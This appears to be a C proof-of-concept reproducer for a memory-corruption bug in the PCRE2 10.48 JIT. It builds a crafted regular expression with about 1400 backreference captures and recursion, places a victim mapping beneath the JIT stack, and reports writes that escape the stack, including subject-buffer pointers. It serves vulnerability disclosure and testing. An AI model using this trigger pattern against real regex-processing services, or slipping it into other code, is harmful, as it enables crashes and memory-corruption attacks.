/*
 * Minimal PCRE2 10.48 JIT-stack underwrite reproducer.
 *
 * Build against an official PCRE2 10.48 build with JIT enabled:
 *
 *   cc -O2 -Wall -Wextra poc.c -lpcre2-8 -o poc
 *   ./poc --physical
 *   ./poc --physical --no-jit
 *   ./poc --logical
 *   ./poc --logical --no-jit
 *
 * Physical mode uses an unmodified 32 KiB..192 KiB PCRE2 stack and maps a
 * separate 1 MiB victim allocation immediately below it. It demonstrates
 * stores outside PCRE2's mmap, including subject-buffer pointers.
 *
 * Logical mode allocates a larger physical SLJIT stack and exposes a normal
 * 32 KiB..192 KiB logical stack in its middle. A 64 KiB writable canary below
 * the logical minimum records JIT stores that escape the advertised stack.
 * This mirrors the four-pointer sljit_stack layout used by PCRE2 10.48.
 *
 * canary_changed is the number of bytes no longer equal to 0xa5, not the
 * number of stores. It can vary when a stored byte happens to equal 0xa5.
 * nearest/farthest/span describe the escaped-write envelope and are the
 * reproducibility fields.
 *
 * PCRE2_ERROR_JIT_STACKLIMIT (-46) alone is not evidence of this bug. Smaller
 * frames can return -46 while leaving the victim untouched. Physical mode
 * succeeds only when the separate victim changes; the relevant output is a
 * nonzero deepest write and at least one subject-buffer pointer. The exact
 * changed-byte and pointer counts can vary with runtime addresses.
 */

#define _GNU_SOURCE
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(__APPLE__)
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <sys/mman.h>
#elif defined(__linux__)
#include <sys/mman.h>
#else
#error "physical mode currently supports macOS and Linux"
#endif

#define STACK_INITIAL (32U * 1024U)
#define STACK_MAX (192U * 1024U)
#define CANARY_SIZE (64U * 1024U)
#define VICTIM_SIZE (1024U * 1024U)
#define PLACEMENT_SEEDS 256U
#ifndef UNIQUE_CAPTURES
#define UNIQUE_CAPTURES 1400U
#endif
#ifndef LOGICAL_SUBJECT_LENGTH
#define LOGICAL_SUBJECT_LENGTH 6U
#endif
#ifndef PHYSICAL_SUBJECT_LENGTH
#define PHYSICAL_SUBJECT_LENGTH 10U
#endif
#define SUBJECT_CAPACITY 256U

#if LOGICAL_SUBJECT_LENGTH > SUBJECT_CAPACITY \
 || PHYSICAL_SUBJECT_LENGTH > SUBJECT_CAPACITY
#error "subject length exceeds SUBJECT_CAPACITY"
#endif

typedef enum {
    MODE_LOGICAL,
    MODE_PHYSICAL
} boundary_mode;

typedef struct {
    void *(*malloc_fn)(size_t, void *);
    void (*free_fn)(void *, void *);
    void *memory_data;
    void *stack;
} jit_wrapper_view;

typedef struct {
    unsigned char *top;
    unsigned char *end;
    unsigned char *start;
    unsigned char *min_start;
} sljit_stack_view;

static unsigned char *append(unsigned char *cursor, const char *text)
{
    size_t length = strlen(text);
    memcpy(cursor, text, length);
    return cursor + length;
}

#if defined(__APPLE__)
static void *reserve_victim(unsigned char *stack_min)
{
    uintptr_t minimum = (uintptr_t)stack_min;
    mach_vm_address_t address;
    kern_return_t result;

    if (minimum < VICTIM_SIZE) return NULL;
    address = (mach_vm_address_t)(minimum - VICTIM_SIZE);
    result = mach_vm_allocate(mach_task_self(), &address, VICTIM_SIZE, 0);
    if (result != KERN_SUCCESS
        || address != (mach_vm_address_t)(minimum - VICTIM_SIZE)) {
        errno = EADDRINUSE;
        return NULL;
    }
    return (void *)(uintptr_t)address;
}
#elif defined(__linux__)
static void *reserve_victim(unsigned char *stack_min)
{
    uintptr_t minimum = (uintptr_t)stack_min;
    void *wanted;

    if (minimum < VICTIM_SIZE) return NULL;
    wanted = (void *)(minimum - VICTIM_SIZE);

    {
        void *mapped = mmap(wanted, VICTIM_SIZE, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                            -1, 0);
        if (mapped == MAP_FAILED) return NULL;
        if (mapped != wanted) {
            (void)munmap(mapped, VICTIM_SIZE);
            errno = EEXIST;
            return NULL;
        }
        return mapped;
    }
}
#endif

static void unmap_victim(void *victim)
{
    (void)munmap(victim, VICTIM_SIZE);
}

static void scan_region(const unsigned char *region, size_t size,
                        size_t *changed, size_t *first, size_t *last)
{
    *changed = 0;
    *first = size;
    *last = 0;

    for (size_t i = 0; i < size; i++) {
        if (region[i] != 0xa5U) {
            if (*first == size) *first = i;
            *last = i;
            (*changed)++;
        }
    }
}

static size_t count_subject_pointers(const unsigned char *region, size_t size,
                                     const unsigned char *subject,
                                     size_t subject_length)
{
    uintptr_t subject_first = (uintptr_t)subject;
    uintptr_t subject_last = subject_first + subject_length;
    size_t count = 0;

    for (size_t i = 0; i + sizeof(uintptr_t) <= size;
         i += sizeof(uintptr_t)) {
        uintptr_t value;
        memcpy(&value, region + i, sizeof(value));
        if (value >= subject_first && value < subject_last) count++;
    }
    return count;
}

int main(int argc, char **argv)
{
    const char *capture = "()\\g{-1}";
    const char *prefix = "((?(DEFINE)\\K";
    const char *suffix = "(*SKIP:NEVER)).{1}(?R)|)";
    size_t pattern_length = strlen(prefix)
                          + UNIQUE_CAPTURES * strlen(capture)
                          + strlen(suffix);
    unsigned char *pattern = malloc(pattern_length + 1U);
    unsigned char *cursor;
    pcre2_code *code;
    pcre2_match_data *match_data;
    pcre2_match_context *match_context;
    pcre2_jit_stack *jit_stack;
    jit_wrapper_view wrapper;
    sljit_stack_view stack;
    unsigned char *sljit_stack_object;
    unsigned char *physical_min;
    unsigned char *physical_end;
    unsigned char *logical_min;
    unsigned char *logical_end;
    unsigned char *victim = NULL;
    void *placement_seeds[PLACEMENT_SEEDS] = { NULL };
    int error_code;
    PCRE2_SIZE error_offset;
    int jit_result;
    int match_result;
    int exit_status;
    char version[64] = "unknown";
    size_t scan_size;
    size_t subject_length;
    size_t first;
    size_t last = 0;
    size_t changed = 0;
    size_t subject_pointers = 0;
    unsigned char subject[SUBJECT_CAPACITY];
    boundary_mode mode = MODE_LOGICAL;
    int mode_seen = 0;
    int no_jit = 0;

    memset(subject, 'A', sizeof(subject));

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-jit") == 0 && !no_jit) {
            no_jit = 1;
        } else if (strcmp(argv[i], "--physical") == 0 && !mode_seen) {
            mode = MODE_PHYSICAL;
            mode_seen = 1;
        } else if (strcmp(argv[i], "--logical") == 0 && !mode_seen) {
            mode = MODE_LOGICAL;
            mode_seen = 1;
        } else {
            fprintf(stderr,
                    "usage: %s [--physical|--logical] [--no-jit]\n",
                    argv[0]);
            return 2;
        }
    }

    if (pattern == NULL) return 2;
    cursor = append(pattern, prefix);
    for (unsigned int i = 0; i < UNIQUE_CAPTURES; i++)
        cursor = append(cursor, capture);
    cursor = append(cursor, suffix);
    *cursor = 0;

    code = pcre2_compile(pattern, pattern_length, 0, &error_code,
                         &error_offset, NULL);
    if (code == NULL) {
        fprintf(stderr, "compile failed: error=%d offset=%zu\n", error_code,
                (size_t)error_offset);
        free(pattern);
        return 3;
    }

    jit_result = pcre2_jit_compile(code, PCRE2_JIT_COMPLETE);
    match_data = pcre2_match_data_create_from_pattern(code, NULL);
    match_context = pcre2_match_context_create(NULL);
#if defined(__APPLE__)
    /* Consume stack-sized mmap slots first. After PCRE2 takes the next slot,
       release the reservations and place the distinct victim below it. */
    if (mode == MODE_PHYSICAL) {
        for (size_t i = 0; i < PLACEMENT_SEEDS; i++) {
            placement_seeds[i] = mmap(NULL, STACK_MAX,
                                      PROT_READ | PROT_WRITE,
                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (placement_seeds[i] == MAP_FAILED) {
                placement_seeds[i] = NULL;
                fprintf(stderr, "cannot reserve placement seed: %s\n",
                        strerror(errno));
                return 5;
            }
        }
    }
#endif
    jit_stack = pcre2_jit_stack_create(
        STACK_INITIAL,
        mode == MODE_PHYSICAL ? STACK_MAX
                              : STACK_MAX + 2U * CANARY_SIZE,
        NULL);
    if (jit_result != 0 || match_data == NULL || match_context == NULL
        || jit_stack == NULL) {
        fprintf(stderr, "setup failed: jit=%d\n", jit_result);
        for (size_t i = 0; i < PLACEMENT_SEEDS; i++)
            if (placement_seeds[i] != NULL)
                (void)munmap(placement_seeds[i], STACK_MAX);
        return 4;
    }

    /* PCRE2 intentionally keeps these types private. Copy their object
       representations into matching 10.48 layout views instead of accessing
       them through incompatible structure lvalues. */
    memcpy(&wrapper, jit_stack, sizeof(wrapper));
    if (wrapper.stack == NULL) {
        fputs("unexpected null SLJIT stack pointer\n", stderr);
        return 5;
    }
    sljit_stack_object = (unsigned char *)wrapper.stack;
    memcpy(&stack, sljit_stack_object, sizeof(stack));
    physical_min = stack.min_start;
    physical_end = stack.end;

    if (mode == MODE_PHYSICAL) {
        if ((uintptr_t)physical_end < (uintptr_t)physical_min
            || (uintptr_t)physical_end - (uintptr_t)physical_min != STACK_MAX) {
            fprintf(stderr,
                    "unexpected JIT stack mapping size: got=%zu expected=%u\n",
                    (size_t)((uintptr_t)physical_end
                             - (uintptr_t)physical_min), STACK_MAX);
            return 5;
        }

#if defined(__APPLE__)
        for (size_t i = 0; i < PLACEMENT_SEEDS; i++) {
            if (placement_seeds[i] != NULL) {
                (void)munmap(placement_seeds[i], STACK_MAX);
                placement_seeds[i] = NULL;
            }
        }
        victim = reserve_victim(physical_min);
        if (victim == NULL) {
            fprintf(stderr,
                    "cannot reserve 1 MiB victim immediately below %p: %s\n",
                    (void *)physical_min, strerror(errno));
            return 5;
        }
#elif defined(__linux__)
        victim = reserve_victim(physical_min);
        if (victim == NULL) {
            fprintf(stderr,
                    "cannot reserve 1 MiB victim immediately below %p: %s\n",
                    (void *)physical_min, strerror(errno));
            return 5;
        }
#endif
        memset(victim, 0xa5, VICTIM_SIZE);
        scan_size = VICTIM_SIZE;
        subject_length = PHYSICAL_SUBJECT_LENGTH;
    } else {
        if ((uintptr_t)physical_end < (uintptr_t)physical_min
            || (uintptr_t)physical_end - (uintptr_t)physical_min
                < STACK_MAX + 2U * CANARY_SIZE) {
            fputs("unexpectedly small SLJIT mapping\n", stderr);
            return 5;
        }

        logical_min = (unsigned char *)((uintptr_t)physical_min + CANARY_SIZE);
        logical_end = (unsigned char *)((uintptr_t)logical_min + STACK_MAX);
        memset(physical_min, 0xa5, CANARY_SIZE);
        stack.min_start = logical_min;
        stack.end = logical_end;
        stack.start = (unsigned char *)((uintptr_t)logical_end - STACK_INITIAL);
        stack.top = logical_end;
        memcpy(sljit_stack_object, &stack, sizeof(stack));
        scan_size = CANARY_SIZE;
        subject_length = LOGICAL_SUBJECT_LENGTH;
    }

    pcre2_jit_stack_assign(match_context, NULL, jit_stack);
    match_result = pcre2_match(code, subject, subject_length, 0,
                               no_jit ? PCRE2_NO_JIT : 0,
                               match_data, match_context);

    scan_region(mode == MODE_PHYSICAL ? victim : physical_min,
                scan_size, &changed, &first, &last);
    if (mode == MODE_PHYSICAL)
        subject_pointers = count_subject_pointers(
            victim, VICTIM_SIZE, subject, subject_length);

    (void)pcre2_config(PCRE2_CONFIG_VERSION, version);
    if (mode == MODE_PHYSICAL) {
        printf("victim mapping : %p .. %p\n", (void *)victim,
               (void *)((uintptr_t)victim + VICTIM_SIZE));
        printf("jit stack mmap : %p .. %p (%u KiB, all PCRE2 owns)\n",
               (void *)physical_min, (void *)physical_end,
               STACK_MAX / 1024U);
        printf("PCRE2=%s mode=physical engine=%s jit_compile=%d "
               "pattern_bytes=%zu subject_bytes=%zu\n",
               version, no_jit ? "interpreter" : "jit", jit_result,
               pattern_length, subject_length);
        printf("pcre2_match returned %d\n", match_result);
        if (changed == 0) {
            puts("victim bytes clobbered: 0");
            puts("deepest write: 0 bytes BELOW the jit stack mapping");
        } else {
            printf("victim bytes clobbered: %zu\n", changed);
            printf("deepest write: %zu bytes BELOW the jit stack mapping\n",
                   VICTIM_SIZE - first);
        }
        printf("aligned words holding a pointer into the subject buffer: %zu\n",
               subject_pointers);
    } else {
        printf("PCRE2=%s mode=logical engine=%s jit_compile=%d match=%d "
               "pattern_bytes=%zu ",
               version, no_jit ? "interpreter" : "jit", jit_result,
               match_result, pattern_length);
        if (changed == 0) {
            puts("canary_changed=0");
        } else {
            printf("canary_changed=%zu nearest=%zu farthest=%zu span=%zu\n",
                   changed, CANARY_SIZE - last, CANARY_SIZE - first,
                   last - first + 1U);
        }
    }

    if (mode == MODE_PHYSICAL) {
        exit_status = no_jit ? (changed != 0 || subject_pointers != 0)
                             : (changed == 0 || subject_pointers == 0);
    } else {
        exit_status = no_jit ? (changed != 0) : (changed == 0);
    }

    if (mode == MODE_LOGICAL) {
        /* Restore the real SLJIT mapping bounds before freeing it. */
        stack.min_start = physical_min;
        stack.end = physical_end;
        stack.start = (unsigned char *)((uintptr_t)physical_end - STACK_INITIAL);
        stack.top = physical_end;
        memcpy(sljit_stack_object, &stack, sizeof(stack));
    }
    if (victim != NULL) unmap_victim(victim);
    pcre2_jit_stack_free(jit_stack);
    pcre2_match_context_free(match_context);
    pcre2_match_data_free(match_data);
    pcre2_code_free(code);
    free(pattern);

    return exit_status;
}
